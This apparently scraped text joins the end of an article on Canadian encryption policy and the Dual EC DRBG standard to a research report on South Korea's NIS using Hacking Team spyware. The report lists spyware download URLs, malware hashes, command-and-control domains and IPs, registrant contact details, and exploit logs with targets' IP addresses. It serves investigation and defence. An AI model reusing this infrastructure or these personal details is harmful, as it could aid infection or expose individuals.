application on telecommunications providers C-13 did so in a more obscure way. Fortunately, under C-13 a provider could challenge an order whereas under C-30 the same provider would have simply had an obligation to disclose keys. In that regard, the C-13 can be seen as an improvement over C-30 with respect to compelling the disclosure of decryption keys. However, the provisions in C-13 could be more intrusive on a case by case basis, depending on the types of conditions ultimately imposed by law enforcement or judges. So, for example, whereas C-30 did not require service providers to develop new decryption capacities, C-13 might, on a case by case basis.\nCompromising Global Encryption Standards\nIn addition to enabling domestic agencies to retroactively decrypt communications Canada’s foreign signals intelligence agency, the Communications Security Establishment (CSE), has been active in undermining key mechanisms that form the basis for encrypted communications. The CSE is Canada’s premier cryptographic organization. Documents provided by by former NSA contractor Edward Snowden to journalists reveal that CSE’s United States counterpart, the National Security Agency (NSA), successfully weakened an encryption standard called DUAL EC DRBG in 2006 that was then approved by the United States’ National Institute for Science and Technology (NIST).\nAs noted above, much of cryptography is dependent on mathematical manipulations of communications based on ‘keys’ or large random numbers. This feature of cryptography means that the ability to generate truly random numbers is integral to any successful encryption scheme. DUAL EC DRBG is a random number generator that could be used by a number of encryption schemes to create any necessary keys. A flawed number generator — particularly one with a known flaw — can render any encryption technique that relies on it insecure, because it becomes exponentially easier to ‘guess’ the ‘key’ and subsequently decrypt the message. In this particular instance, the NSA could exploit the flaw in the DUAL EC DRBG and, after NSA had successfully pushed its adoption as a national standard, the agency proceeded to advance it as an accepted international standard.\nThe NSA’s Canadian partner, CSE, ran the international committee at the International Organization for Standardization (ISO) that was responsible for evaluating and authorizing DUAL EC DRBG. Some “behind-the-scenes finessing” from the head of CSE and members of the NSA took place, which led to the NSA rewriting the drafted international standard. Meanwhile, the NSA ensured that its flawed version of DUAL EC DRBG was included as a Federal Information Processing Standard (FIPS), a set of standards approved by the US Government for use in non-military government computer systems. CSE similarly leveraged its role as steward of Canada’s government defensive capabilities to ensure that the flawed standard was included in a list of approved algorithms that must be used for any Canadian and US Government procurement. The consequence of this  NSA’s ‘finessing’ was to propagate and grant legitimacy to a method of data encryption known to be vulnerable.\nAs a result, DUAL EC DRBG has been incorporated into a range of products, including those from security company RSA, in operating systems such as Microsoft Windows,and in a version of OpenSSL (a tool commonly used to facilitate website encryption). The integration of the standard with operating systems was significant because, by changing the default method by which the operating system encrypted communications traffic, an intelligence agency could decrypt data now encrypted using DUAL EC DRBG. The secret of the standard’s weakness got out quickly: researchers discovered and disclosed the vulnerabilities in 2007. Nonetheless, the standards’ ISO and FIPS status was not revoked, and agencies such as CSE continued to retain it on their cybersecurity recommendation lists, allowing it to persist in spite of its known flaws.\nWhile organizations like the NSA and CSE are expected to try and break cryptographic protocols, and while they have a history of deliberately providing ‘weak’ encryption to potential intelligence targets, the deliberate weakening of cryptographic standards themselves is dangerous. Such activity calls into question all of the cryptographic protocols that the NSA and CSE (and their allies) have had a hand in testing and approving. Moreover, such weaknesses call into question the legitimacy of established venues to create, test, and legitimize new cryptographic algorithms.\nCanada’s Quiet War on Encryption?\nIn aggregate, the federal government of Canada has been actively trying to undermine the privacy and security afforded by encryption for at least two decades, with varying degrees of success. What began with quiet regulations that only industry insiders were aware of has transitioned to efforts to expand the kinds of communications covered by the Solicitor General’s Enforcement Standards (SGES) and, ultimately, to a legislative language that may compel the preservation and disclosure of decryption keys. At the same time, Canada’s signals intelligence agency has been caught deliberating weakening at least one cryptographic standard.\nCanadians’ default ways of conducting mobile communications have been subject to decryption requirements since the 1990s. The SGES largely prevents Canadians from securely communicating using voice or SMS messages, unless they use a third-party Voice Over Internet Protocol (VoIP) or texting application. The result is that they ways that millions of Canadians speak with one another are made insecure by secret government regulation. Moreover, the government of Canada has established encryption key preservation and disclosure laws. Consequently, companies and persons who provide encrypted communications could be compelled to disclose decryption keys to government authorities. Such disclosures would effectively undermine the security that Canadians think they enjoy when communicating using SSL, TLS, or other encryption protocols.\nIn addition to ostensibly weakening communications for law enforcement purposes, the Canadian government vis-a-vis its signals intelligence agency intentionally advocated for, and propagated, a deficient security standard around the world. This standard rendered hundreds of millions of people’s communications less secure; in addition to the United States’ National Security Agency paying a security company, RSA, $10 million dollars to implement the standard, major operating system vendors such as Microsoft included DUAL EC in their products. The consequence was, and remains, that Canada has intentionally undermined the privacy and security of Canadians who use RSA and Microsoft products along with millions of other people around the world.\nDespite the aforementioned activities, the Canadian government has not formally taken as strong a position as the American or British government concerning cryptography. To date, Canadian officials have not publicly called for ‘backdoors’, or deliberate cryptographic vulnerabilities that companies must include in their products in order to provide decrypted versions of communications to authorities upon request. But this public restraint may simply be reflective of the fact that the federal government’s quiet war on encryption has been surprisingly successful: the default mobile communications of most Canadians are accessible to government, decryption keys can be compelled from companies, and hundreds of millions of people have cryptographic suites installed on their computers that are exploitable by Canada’s signals intelligence agency.\nHow the federal government of Canada develops and implements national encryption policies can deeply influence Canadians’ abilities to compete in the digital economy. Bad policies undermine the sense of security that Canadians enjoy when they conduct daily activities online and when they make purchases online. Bad policies make it harder for non-Canadians to trust the security and privacy assurances given by Canadian businesses. And, perhaps even worse, bad policies mean that Canada’s advice will not be taken when it comes to developing, and advocating for, genuinely secure encryption protocols. In effect, bad policy hinders Canada’s stature in the world and Canadians’ capabilities to participate in the growing digital economy.\nEncryption policies should be a non-partisan issue. All politicians, and all Canadians, should advocate for strong, reliable cryptographic protections so that Canadian businesses can thrive and Canadian citizens enjoy private communications. But instead of successive federal governments trying to enhance online security the governments have been actively trying to weaken online security. As a result, encryption policy debates need to receive far more attention from the public, policy makers, and politicians alike: this critical policy issue must debated in the light of the public eye instead of continuing to languish in the shadows of secretive government policy shops.\nText Sources\n\nMatthew M.

    "text": "\n\t\t\t\tAuthors: Bill Marczak, Sarah McKune\nSummary\nThis research note outlines what we know about the use of Hacking Team’s Remote Control System (RCS) by South Korea’s National Intelligence Service (NIS).  The note synthesizes information found in publicly leaked materials, as well as our own research.\nThe data available in the leaked Hacking Team files provides circumstantial evidence pointing to an interest in compromising individuals with ties to South Korea (i.e., Korean language speakers who use software or apps popular in South Korea, or South Korean editions of Samsung phones).\nThe leaked data alone cannot identify specific individuals targeted by NIS, nor prove misuse of the technology; further investigation and research is necessary to make those determinations.  Moreover, the presence of intrusion software does not necessarily equate to its misuse, as such software may be utilized by intelligence or law enforcement agencies in a manner that conforms with rule of law and democratic principles. We are releasing this report in order to assist with further investigation and research into South Korea’s use of Hacking Team.\n \n요약\n본 연구노트는 한국 국정원의 해킹팀 RCS (Remote Control System) 사용에 관해 저희가 알고 있는 것을 개략적으로 기술한 것입니다. 노트에는 공개적으로 유출된 자료와 저희의 연구를 통해 발견된 정보가 함께 포함되어 있습니다.\n중요한 것은, 유출된 해킹팀 파일에서 발견된 자료에는 국정원이 한국과 관련 있는 개인 (민간인) 들을 사찰하는 데 관심이 있었다는 정황적 증거들(사례 : 한국에서 대중적인 소프트웨어나 앱을 사용하는 한국어 사용자 또는 삼성의 내수용(한국 에디션) 스마트폰)이 포함되어 있다는 점입니다.\n유출된 자료만으로는 국정원이 대상으로 삼은 특정인의 신원을 알 수 없으며, 해당 기술이 악용되었는지도 증명할 수 없습니다. 이를 확인하기 위해서는 추가적인 조사와 연구가 필요합니다. 또한 침입소프트웨어/해킹프로그램이 존재한다고 하여 악용되었을 것이라고 단정하기 어렵습니다. 정보기관이나 법집행기관이 이러한 프로그램을 적법한 절차와 민주적 원칙에 따라 사용할 수도 있기 때문입니다. 저희는 한국에서의 해킹팀 사용에 대한 추가적인 조사와 연구를 돕고자 본 보고서를 공개합니다.\n \nBackground\nThe National Intelligence Service (NIS) is Korea’s main intelligence agency. It was founded in 1961 as the Korea Central Intelligence Agency (KCIA).1  The name and functions of the agency have evolved considerably over time.  Named the NIS in 1999, it has a three-part mandate: domestic security, national security, and counterintelligence operations against North Korea.2  Despite widely-reported reform efforts, the agency continues to face criticism for reported and perceived abuses of its power and mandate.3\nRecent Scrutiny of NIS\nThe NIS has been scrutinized for misuse of its powers in a number of cases, which have been revisited in media coverage of the Hacking Team leaks.\nIn February 2015, a former NIS director was sentenced to three years in prison for ordering NIS agents to attempt to influence the 2012 presidential elections by posting negative comments about President Park Geun-hye’s rivals.4  Some of the 1.2 million comments that prosecutors say NIS agents posted accused President Park’s rivals of being pro-North Korean sympathizers.5  NIS denied interfering in the election, claiming that the agency’s online activities were solely directed at North Korea.6  Recently, the Supreme Court ordered a retrial in the case, as some evidence used to convict the former director was ruled inadmissible.7\nAdditionally, in 2005, a former deputy chief of NIS was arrested for illegal wiretapping.  The prosecutor in the case stated that the deputy chief may have attempted to destroy evidence in the case before his arrest.8\nPrevious Citizen Lab Report\nIn February 2014, Citizen Lab released a report entitled “Mapping Hacking Team’s ‘Untraceable’ Spyware,” which identified 21 suspected government users of Hacking Team’s RCS spyware, including South Korea.9  The report triggered limited media coverage in South Korea at the time.10\nCurrent Scandal\nOn July 6, 2015, it became clear that Hacking Team had suffered a substantial compromise of its internal systems.11  Shortly thereafter, much of Hacking Team’s code, data, and communications were leaked into the public domain.  The material not only confirmed that South Korea was a customer of Hacking Team, but exposed substantial commercial interactions between Hacking Team and the “5163 Army Division,” whose mailing address matches that of the NIS,12 and is reported to be a codename of the NIS.13\nShortly after this revelation, an employee of the NIS reportedly committed suicide.  A note claimed he had deleted information regarding the NIS’s use of Hacking Team RCS,14 triggering nationwide interest in who the NIS was targeting.15  Lawmakers said that, in a closed-door meeting, the NIS admitted to purchasing Hacking Team spyware.16  A lawmaker in the Intelligence Committee of the National Assembly of the Republic of Korea disclosed that the NIS testified to the Committee that it had used Hacking Team spyware more than 200 times for counterespionage, and to track the North Korean arms trade.17\n \nThe NIS Purchases Hacking Team\nAccording to the leaked files, a South Korean company called Nanatech introduced itself to Hacking Team in August 2010, claiming that it provided “support” in relation to “telecommunication equipments to domestic companies.”18  Nanatech was purportedly attempting to acquire solutions to monitor Skype on behalf of its customer,19 and noted that the customer was also interested in “monitoring the voice conversation on the mobile phone.”20  Nanatech stated that Hacking Team competitor Gamma Group, developer of FinFisher, was also dealing with its customer through another reseller.21\nNotably, it appears that Nanatech never informed Hacking Team that its customer was NIS. In November 2010, Nanatech responded to Hacking Team queries pressing for more information on its customer22 with “About end-user: Our client is the research team of Army (named KINSTEL). I think you don’t have to worry about it,” which appeared to satisfy Hacking Team.23 Renewed exchanges in June 2011 also indicated the “army” as end user.24 In proceeding with the purchase, Nanatech specifically identified its customer to Hacking Team in November 2011 as the “5163 Army Division.”25 The mailing address that Nanatech provided for the Division matches that of the NIS,26 and “5163 Army Division” is reported to be a codename of the NIS.27 This obfuscation of customer identity raises significant questions regarding corporate due diligence and overall transparency in identifying end users of the spyware. Indeed, end user verification is often required by export licensing regimes.\nIn subsequent emails28 and in its customer list,29 Hacking Team also variously referred to the customer as “South Korea Army,” “SKA,” or “The Army South Korea.”\nNanatech organized a visit for two representatives from the customer, Sunny Han and Se-Hun Lee, and one person from Nanatech,30 to Hacking Team’s offices in Milan on 21-22 November 2011.31 Nanatech mentioned that they had managed to outmaneuver the competition, and arranged for the customer to meet with Hacking Team before any meeting with competitors Gamma International and Trovicor.32 After the meeting in Milan, Nanatech expressed that the customer wanted to rush to purchase Hacking Team’s RCS, claiming that they needed to spend their budget by 20 December 2011.33\nAfter some back and forth, Nanatech’s customer accepted offer #NA111214Q1.34 (See Figure 1 below.) The offer included the ability to monitor a total of 10 targets simultaneously on Windows, Symbian, Blackberry, iPhone, and Android platforms. It also included the Remote Mobile Infection/Installation (RMI) feature, and one year of zero-day exploits and maintenance. RMI apparently involves sending WAP push messages (SI and SL) through a GSM modem to mobile devices.35 Depending on phone settings, such messages can automatically open a browser window or attempt to install an application, and can appear to be from the user’s mobile phone operator. The total cost was €390,000.\nFigure 1: Nanatech Offer #NA111214Q1.36\nA letter of credit (#M03QY112GS0014) was issued for this offer,37 with delivery to be made to the “5163 site.” (See Figure 2 below.)\n\nFigure 2: Excerpts from Letter of Credit issued for Offer #NA111214Q1.38\nDelivery was completed and accepted by the “5163 Army Division.”39 (See Figure 3 below.) The license agreement for Hacking Team’s RCS spyware was signed by Sunny Han.40 (See Figure 4 below.)\n\nFigure 3: Certificate of Acceptance in relation to Letter of Credit #M03QY112GS0014 from the “5163 Army Division.”41\n\nFigure 4: Excerpts from License Agreement between Hacking Team and the “5163 Army Division.”42\nThe Korean customer purchased 10 additional target licenses in August 2012, for €57,600, allowing them to monitor a total of 20 targets simultaneously.43\nOn 6 December 2012, the Korean customer expressed interested in purchasing an additional 30 target licenses, which would have allowed it to monitor 50 targets at once.44 The purchase was apparently never completed, and it appears that no further target license purchases were initiated.\n \nTargets in South Korea?\nThe data available in the leaked Hacking Team files provides circumstantial evidence pointing to an interest in compromising individuals with ties to South Korea (i.e., Korean language speakers who use software or apps popular in South Korea, or South Korean editions of Samsung phones). However, the leaked data does not identify the targets, or conclusively show whether these targets were inside or outside Korea.\nInterest in Targeting South Korean-Edition Phones\nThe customer communicated with Hacking Team via the email accounts devilangel1004@gmail.com45 (“devilangel”) and smiolean@gmail.com.46  Devilangel filed several support tickets47,48,49,50 in August and September 2012 asking for support for call recording on “SHW-M series” (South Korean edition) Samsung phones, as well as, in one case, on “Galaxy S3 Chinese models.” Nanatech also contacted Hacking Team to ask for voice recording support for South Korean edition Galaxy 3 phones.51 In January 2013, Nanatech sent a South Korean edition Galaxy S3 to Hacking Team52 to help them support call recording.53 An August 2013 e-mail requests that Hacking Team test their Android exploit against South Korean edition phones.54\nInterest in Targeting South Korean Software (KakaoTalk and AhnLab Anti-Virus)\nDevilangel requested that Hacking Team test their solution against the latest version of South Korean company AhnLab’s antivirus program,5 as well as popular Chinese anti-virus programs, mentioning that they have “some targets in China.”56\nAccording to a trip report filed by a Hacking Team employee who visited the Korean customer on 24 March 2014, the customer “asked about the progress of Kakao Talk which they mentioned is very commonly used in their country.”57  One of the “key takeaways” of the report was that “Kakao Talk is something which SKA is emphasising.”  The customer also requested support for voice and message recording on the PC versions of KakaoTalk and LINE (a chat application similar to KakaoTalk developed by LINE Corporation, a Japan-based company).58\nKakaoTalk is a chat program developed and owned by the South Korea-based company Daum-Kakao. A May 2015 article notes that KakaoTalk is the most popular chat application used in South Korea and has 35 million users in the country, representing 70% of South Korea’s population of 50 million.59\nKakaoTalk has previously been the target of government pressure. In 2014, President Park Geun-hye announced a crackdown on the spread of rumors online following criticism of how her administration handled the capsize of a South Korean ferry. As part of this crackdown, a South Korean student and an opposition politician involved in discussions and protests around the ferry incident were notified that law enforcement officials were given access to data from their KakaoTalk accounts.60\nInterest in Deploying Spyware via OTA Updates and Wireless Networks\nNanatech also twice inquired about “over the air”61 and Wi-Fi infections, mentioning they wanted to “remotely and forcibly ‘push’” the spyware “in a stealth manner onto the target’s device without his knowledge or cooperation.”62 The Korean customer expressed interest in Hacking Team’s TNI (Tactical Network Injector),63 a laptop that “provides everything needed in order to crack a WiFi network, join it, identify the interested target and deploy the RCS Agent.”64  The TNI can also create rogue WiFi networks, and can even work with wired networks given special infrastructure access. The Korean customer tested the TNI from April65 until July 2014, but ultimately decided not to purchase the TNI, citing issues including lack of reliable support for mobile phones.66\nUse of Korean Bait Content\nWe identified several instances of the Korean customer using Korean language or Korea-themed bait content:\n\nWe observed a drive-by-download attack in 2014 that used a bait content file called “free korean movies.” (see: Attribution of “Drive-by-Download” Samples below)\nIn the leaked files, we found bait content including a file containing the names and phone numbers of Seoul University alumni in Southern California,67 and a file containing information pertaining to the sinking of the ROKS Cheonan,68,69 (and a Computer Science presentation about Machine Learning).70,71\nOne bait content link72,73,74 contained a picture showing the schedule for the 2015 Geumcheon Harmony Cherry Blossom Festival in Seoul, while another one contained a link to a blog about reviews of rice cake dishes at Korean restaurants.75,76,77,78\nOne bait content link contained a link to a Google app on the Google Play Store called “Google Korean Input.”79,80\n\n \nAttribution of “Drive-by-Download” Samples\nThe leaked Hacking Team e-mails allowed us the opportunity to attribute several samples of Hacking Team RCS spyware that we previously observed:\n\nSHA256: cbde6a113a54b8dcf122d9d879b7c21c8b03a89d792f49210bbe41e8466d121a\r\nURL: http://free.dramakorea.asia/s/free_korean_movies.exe\n\nThe command and control (C&C) server used in the sample is hulahope.mooo.com, which matches the C&C for numerous Android samples submitted by devilangel to Hacking Team for preparation of exploits. This sample was submitted to VirusTotal on 21 July 2014, and was submitted eight additional times to VirusTotal in the following month, including twice from Korea.81  This sample appears to have been served through a drive-by-download strategy, involving a file “x.js:”\n\nSHA256: 8793d6eda87163b04a3db9251ff89b7c8a66500a4ed475c7026b5fc9a4c8abe9\n\nOn its own, the script causes an Internet Explorer user to see a popup asking them to authorize an ActiveX control. If the control is authorized, then the spyware is downloaded and executed.\nWe also found the following sample:\n\nSHA256: 21e8d495bca60edc3b64ac970f9a9fa896d0eadc6491452ea937d64849b1f4a0\r\nURL: http://shrook.mooo.com/cn/notify.exe\n\nThe sample was submitted to VirusTotal once on September 12, 2014,82 and was apparently served by the same drive-by-download javascript method. The C&C server is also hulahope.mooo.com.\n \nAnalysis of Bait Content\nAccording to the leaked documents, Hacking Team provides an exploit service to customers that requires that the customers transmit them basic information, including a bait document or link, and their monitoring agent.83 Depending on the type of request, Hacking Team then modifies the bait document to include an exploit to install the agent, or creates a URL that, when clicked, exploits the target’s web browser to install the agent. The exploits and agents are hosted on servers belonging to Hacking Team. Hacking Team sends the bait documents back to the customer, who can then send the booby-trapped bait document to targets to infect them.84  The leaked Hacking Team documents contain numerous customer requests to create exploit documents or links, often with bait content attached. In some cases, these bait documents or links speak to the interests, or identity, of potential targets.\nDevilangel expressed concern about having to furnish Hacking Team with bait content used to infect victims, as the information “can be related with my target.”85 Hacking Team responded that they do not “retain any information about the files the customers send us” (note, however, we were able to identify many files sent by devilangel for infection) and suggested that devilangel choose a document “containing not so sensitive data.”86 Given devilangel’s concerns and Hacking Team’s advice, bait documents may have been chosen to minimize the link between the bait content and the target.\nDevilangel’s exploit requests also sometimes included a statement as to whether the exploit would be used for “testing” or “real targets.” Below, we provide an overview of some common themes associated with the bait content and bait links submitted by devilangel to Hacking Team. We exclude any marked “testing:”\n\nWe describe Korean-themed bait content above (see: Use of Korean Bait Content).\n\n\nSome of the bait content includes generic holiday greetings.  For example, “Happy New Year” messages, or Christmas greetings\n\n\nFigure 5: A “Happy New Year!” bait document submitted by devilangel to create an exploit document.87\n\nFigure 6: A “Christmas Blessing” e-card submitted by devilangel to create an exploit link.88\n\nA number of pieces of bait content included medical themes, including a PowerPoint presentation about a Belfast cancer conference, and links about MERS89 and Avian Flu.90\n\n\nFigure 7: A bait document about the 2015 National Cancer Intelligence Network (NCIN) Cancer Outcomes Conference submitted by devilangel to create an exploit document.91\n\nSome bait content included tips for protecting online privacy, including one PowerPoint presentation called “Save you Privacy” and a Word document called “How to Access and Clear Your iPhone’s Web Browsing History.”\n\n\nFigure 8: A bait document containing information about iPhone browsing history submitted by devilangel to create an exploit document.92\n\nSome bait links involved Asian pornography, including a website featuring “only Chinese porn,”93 a page on a pornography website featuring a search for the term “chinese,”94 and a website called “Asian Porn Tube.”95,96\n\n \nExploit server Logs\nThe leaked Hacking Team data contains files “Exploit_Delivery_Network_android.tar.gz,” and “Exploit_Delivery_Network_windows.tar.gz,” which appear to contain detailed information about each exploit link or document generated by Hacking Team upon customer request (for May and June 2015), as well as details of which IP addresses clicked on each link (or opened each document), whether the exploitation was successful or not, which website directed each visitor to the exploit (if applicable), as well as the language and model of the phone (in some cases of Android exploits). The log information is in “var/www/files/[ID]/log.jsonl,” where “[ID]” is the six character alphanumeric ID assigned to the exploit by Hacking Team.\nWe present details on all clicks on Android exploit links below (we did not identify any Windows exploits requested by Hacking Team during this period). Hacking Team’s Android exploit involved a link sent to the target’s phone. If the target opened the link in the built-in Android web browser app, then the exploit may have installed Hacking Team’s RCS on their phone. Importantly, the list below excludes individuals who did not click on the link (as Hacking Team cannot record logs in this case):\n\n\n\nID\nTime97\nIP\nCountry\nPhone\nLocale\nReferer URL\nHit?98\n\n\nBBltjx99\n6/29/2015 13:01:49\n212.5.158.22\nBG\nNX403A\nen-US\n\nNo\n\n\nBBltjx\n6/29/2015 13:02:16\n212.5.158.70\nBG\nNX403A\nen-US\n\nNo\n\n\nbO47cc100\n6/22/2015 11:24:22\n93.84.2.181\nBY\nSM-A500F\n\n\nNo\n\n\nBR2u9z101\n6/22/2015 10:50:03\n109.188.125.17\nRU\nSM-G800H\n\n\nNo\n\n\n8CS48M102\n6/18/2015 10:32:23\n92.230.140.206\nDE\nGT-I9103\nko-KR\n\nNo\n\n\nv9K0GQ103\n6/18/2015 10:45:13\n213.87.129.241\nRU\nGT-I8190\nru-RU\n\nYes\n\n\njAWxkt104\n6/26/2015 01:33:51\n220.181.132.217\nCN\nG700-U00\nzh-CN\nhttp://video.sexyhub.co/x/?rd=SjLzM2\nNo\n\n\nzuggfM105\n6/17/2015 11:23:43\n49.230.231.158\nTH\nSM-G900F\n\n\nNo\n\n\nzuggfM\n6/17/2015 11:28:25\n49.230.225.3\nTH\nSM-N910C\n\n\nNo\n\n\nzuggfM\n6/17/2015 15:37:27\n139.193.176.58\nID\nS5E\nen-US\n\nNo\n\n\nzEsa9i106\n6/17/2015 10:55:09\n111.80.143.117\nTW\nSM-G900I\n\n\nNo\n\n\nvYLpBl107\n6/18/2015 03:34:39\n175.168.46.204\nCN\nSAMSUNG-SM-N9008V_TD\nzh-CN\n\nNo\n\n\n8n3gio108\n6/12/2015 12:01:41\n114.124.0.237\nID\nGT-S7270\n\n\nNo\n\n\n7ZSBlX109\n6/4/2015 06:32:58\n223.62.169.2\nKR\nSHV-E250S\nko-KR\nhttp://dns.cdc-asia.org/docs/7ZSBlX/fwd\nYes\n\n\n9hN2Zn110\n6/1/2015 9:07:03\n41.210.154.105\nUG\nGT-I9100\nko-KR\n\nNo\n\n\n9hN2Zn\n6/1/2015 9:14:43\n41.210.154.13\nUG\nSM-N900\n\n\nNo\n\n\nuPz4mj111\n6/17/2015 10:46:17\n223.62.212.18\nKR\nGT-N7100\nen-PH\nhttp://link.sexyhub.co/docs/uPz4mj/fwd\nYes\n\n\n\nSouth Korean Targets?\nThe data shows that there were two successful Android exploitations of phones with Korean IP addresses: one SK Telecom edition Galaxy Note 2 with SK Telecom IP address and Korean-Korea locale, one international Galaxy Note 2 with SK Telecom IP address and English-Phillippines locale. There was only one other successful exploit in May and June 2015: a Galaxy S3 Mini with a Russian IP address and Russian-Russia locale.\nOne individual with a Ugandan IP address, and one individual with a German IP address, clicked on the link with their locale set to “Korean-Korea.”\n \nCommand and Control and Exploit Infrastructure\nUsing referrer URLs in the exploit server logs, as well as domain names and IP addresses found in the Korean customer’s malware samples, we were able to characterize their Hacking Team infrastructure.\nWe start from the domain name dns.cdc-asia.org, used in a referrer URL seen in the exploit logs. We assume that the Korean customer controlled dns.cdc-asia.org, because this URL referred to the exploit requested from Hacking Team, and was not sent to them by Hacking Team. We further assume that the customer controlled the domain name cdc-asia.org, as the registration date of the domain (June 3, 2015) matches the date that devilangel requested the exploit112 that was clicked on with referring domain dns.cdc-asia.org.\nWe found the following registrant information for cdc-asia.org:\n\nRegistrant Name:krystal Freeman\r\nRegistrant Organization:Co\r\nRegistrant Street: 136 Driftwood Road\r\nRegistrant City:CA\r\nRegistrant State/Province:CA\r\nRegistrant Postal Code:95129\r\nRegistrant Country:US\r\nRegistrant Phone:+1.14083799445\r\nRegistrant Email:insomnia214@outlook.com\r\nName Server:NS4.ITITCH.COM\r\nName Server:NS3.ITITCH.COM\r\nName Server:NS2.ITITCH.COM\r\nName Server:NS1.ITITCH.COM\n\nThe name server suggests that the domain was registered with ititch.com, a service for purchasing domain names and web hosting using Bitcoin.\nWe found two other domains registered with the same registrant email:\nmytelkomsel.co\ntelegram-apps.org\nWe plugged these domains, as well as cdc-asia.org, into PassiveTotal113 in order to identify other domains using the same IP address. PassiveTotal is an infrastructure analysis tool designed for security research. We found that cdc-asia.org resolved to 180.235.132.45, and two other websites resolved to this same address: droidlatestnews.com, and enjoyyourandroid.com.\n\nFigure 9: Excerpt of PassiveTotal results for 180.235.132.45.\nThe initial registrant information for both domains was as follows:\n\nRegistrant Name: Leonard Freeman\r\nRegistrant Organization: N/A\r\nRegistrant Street: 1203 Grove Street   \r\nRegistrant City: Bethpage\r\nRegistrant State/Province: New York\r\nRegistrant Postal Code: 11714\r\nRegistrant Country: US\r\nRegistrant Phone: +1.4194763271\r\nRegistrant Email: mappingmechanism@hotmail.com\r\nName Server: domains4bitcoins.earth.orderbox-dns.com\r\nName Server: domains4bitcoins.mars.orderbox-dns.com\r\nName Server: domains4bitcoins.mercury.orderbox-dns.com\r\nName Server: domains4bitcoins.venus.orderbox-dns.com\n\nThe name server suggests that the domain was registered with domains4bitcoins.com, a service for purchasing domain names and web hosting using Bitcoin.\nNote that the registrant name, “Leonard Freeman,” uses the same surname, “Freeman,” as the registrant for the previous three domains “Krystal Freeman.” The registrant email address for both domains was updated after July 8, 2015 (after the Hacking Team leak) to the following:\n\nRegistrant Name: Alexis\r\nRegistrant Organization: N/A\r\nRegistrant Street: 4403   \r\nRegistrant City: Los Angeles\r\nRegistrant State/Province: California\r\nRegistrant Postal Code: 90017\r\nRegistrant Country: US\r\nRegistrant Phone: +1.9174849999\r\nRegistrant Email: prmgrabzi@hotmail.com\n\nWe plugged droidlatestnews.com and enjoyyourandroid.com into PassiveTotal, and found that these resolved to 95.215.46.224. We found several other domains that resolved to this IP address:\n\nbijiaexhibition.com\r\nsamsung-update.net\r\ngetnewandroid.com\r\nsecure.anyurl.org\r\nupdate.indoorapps.com\n\nWe also checked registrant email addresses and phone numbers to find additional domains:\n\nfacebook-update.info\r\nsamsung-update.net\r\nplay-mob.org\n\nIt is noteworthy that play-mob.org was registered on 8 April 2015, a day after devilangel requested Android exploits redirecting to “play.mob.org”.114 We provide a list of suspected domain names linked to the Korean customer below, including the domain names above, as well as domain names from RCS samples submitted by devilangel to Hacking Team, and RCS samples detected by Hacking Team on VirusTotal and attributed to the same customer:\n\ncdc-asia.org\r\nmytelkomsel.co\r\ntelegram-apps.org\r\nbijiaexhibition.com\r\nsamsung-update.net\r\ngetnewandroid.com\r\nfacebook-update.info\r\nsamsung-update.net\r\nplay-mob.org\r\nboardingpasstohome.com115\r\nmywealthpop.com116\r\nsecure.anyurl.org\r\nupdate.indoorapps.com\r\nvideo.sexyhub.co\r\nlink.sexyhub.co\r\nshrook.mooo.com\r\nfree.dramakorea.asia\r\nnkpro.lalanews.net117\r\nandroidgplay.us.to118\r\nhulahope.mooo.com\r\npubliczone.now.im119\r\nreflect.dalnet.ca120\r\npantheon.tobban.com121\n\nThe domain names above were associated with the following e-mail addresses:\n\ncheckonetwothree@hotmail.com\r\nmappingmechanism@hotmail.com\r\nwatermelonholicq@eclipso.email\r\ninsomnia214@outlook.com\r\nprmgrabzi@hotmail.com\n\nWe also identified the following IP addresses associated with the Korean customer’s infrastructure:\n\n131.72.137.10\r\n198.105.125.107\r\n198.105.125.108\r\n131.72.137.11\r\n198.105.122.117\r\n185.7.35.79\r\n131.72.137.104\r\n131.72.137.101\r\n95.215.46.224\r\n180.235.132.45\r\n103.13.228.240\r\n185.10.57.150\r\n46.19.143.244\r\n37.46.114.43\r\n5.199.166.180\n\nIt also appeared that the Korean customer’s exploits were served from the following IP addresses, which may belong to Hacking Team, and thus have also been used to serve exploits for other Hacking Team customers:\n\n46.38.63.194\r\n188.166.5.201\r\n46.38.63.112\r\n46.251.239.150\r\n212.117.180.108\n\nIn our 2014 report, “Mapping Hacking Team’s ‘Untraceable’ Spyware,” we identified the following IP addresses associated with the South Korean customer:\n\n211.51.14.129\r\n101.99.83.12\r\n5.255.87.146\r\n198.144.178.104\r\n198.144.178.118\r\n204.188.221.198\r\n185.7.35.79\r\n185.7.35.80\r\n64.32.12.75\r\n124.217.245.64\r\n185.29.8.202\n\n \nConclusion and Further Investigation\nWe have outlined circumstantial evidence indicating that NIS was interested in targets with links to South Korea, and in two cases infected devices belonging to “real targets” inside South Korea.\nThe leaked data alone cannot identify specific targets. Thus, we presented some technical data regarding the NIS’s Hacking Team RCS command and control infrastructure, which may be useful in further investigation.\nWe briefly outline some promising avenues for further investigation:\n\nFirst, obtaining DNS logs over the past year associated with the domains publiczone.now.im and hulahope.mooo.com would be very helpful, as this would reveal IP addresses of infected devices.\n\n\nSecond, organizations or institutions that run Intrusion Detection Systems should check their logs for hits on the IP addresses and domain names provided herein.\n\n\nThird, groups focused on testing should scan the e-mail accounts of potential targets, as well as their SMS message logs, WAP push message logs, and logs of any other mobile messaging apps, for any e-mails or messages containing the domain names we identified (or any links, such as Tinyurl links, that unshorten to these domains), and any attachments matching Hacking Team’s exploits or spyware.\n\n\nFinally, if NIS initiated their Bitcoin domain name purchases from a single address, it may be possible to trace NIS’s Bitcoin address by searching the Blockchain using the registration times associated with the domains. Tracing NIS’s Bitcoin address could illuminate further elements associated with their C&C architecture.\n\n \nFootnotes\n1 http://eng.nis.go.kr/svc/history.do?method=content&cmid=11915\n2 http://www.economist.com/blogs/banyan/2014/03/south-korean-intelligence\n3 http://www.economist.com/blogs/banyan/2014/03/south-korean-intelligence\n4 http://www.bbc.com/news/world-asia-31284704\n5 http://www.nytimes.com/2013/11/22/world/asia/prosecutors-detail-bid-to-sway-south-korean-election.html\n6 http://www.nytimes.com/2013/05/01/world/asia/prosecutors-raid-south-korean-spy-agency.html\n7 http://www.reuters.com/article/2015/07/16/southkorea-spychief-retrial-idINKCN0PQ0LJ20150716\n8 http://web.international.ucla.edu/asia/article/31102\n9 https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/\n10 http://www.ohmynews.com/NWS_Web/view/at_pg.aspx?CNTN_CD=A0001970476\n11 http://www.wired.com/2015/07/hacking-team-breach-shows-global-spying-firm-run-amok/\n12 See “서울 서초우체국 사서함 